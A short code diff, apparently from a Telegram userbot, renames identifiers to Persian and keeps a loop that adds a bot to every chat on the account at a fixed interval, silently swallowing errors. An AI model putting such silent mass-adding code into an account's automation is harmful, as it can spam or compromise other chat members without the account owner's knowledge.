-            if chat_id in [chat.id for chat in common_chats]:
+        
+        async for گفتگو in client.get_dialogs():
+            شناسه_چت = گفتگو.chat.id
+            if شناسه_چت in [chat.id for chat in چت‌های_مشترک]:
                 continue
             try:
-                await client.add_chat_members(chat_id, bot_id)
-            except Exception as e:
-                await asyncio.sleep(60)  
-    except Exception as e:
+                await client.add_chat_members(شناسه_چت, شناسه_ربات)
+            except Exception:
+                await asyncio.sleep(60)
+    except Exception:
         pass
-async def continuous_add():
+
+async def افزودن_مداوم():
     while True:
-        if AUTO:
-            await add_bot_to_chats()
+        if خودکار:
+            await افزودن_ربات_به_چت‌ها()
+        await asyncio.sleep(فاصله_افزودن)
 
-        await asyncio.sleep(ADD_INTERVAL)
-
-if AUTO:
-    asyncio.create_task(continuous_add())
+if خودکار:
+    asyncio.create_task(افزودن_مداوم())
+    
+    
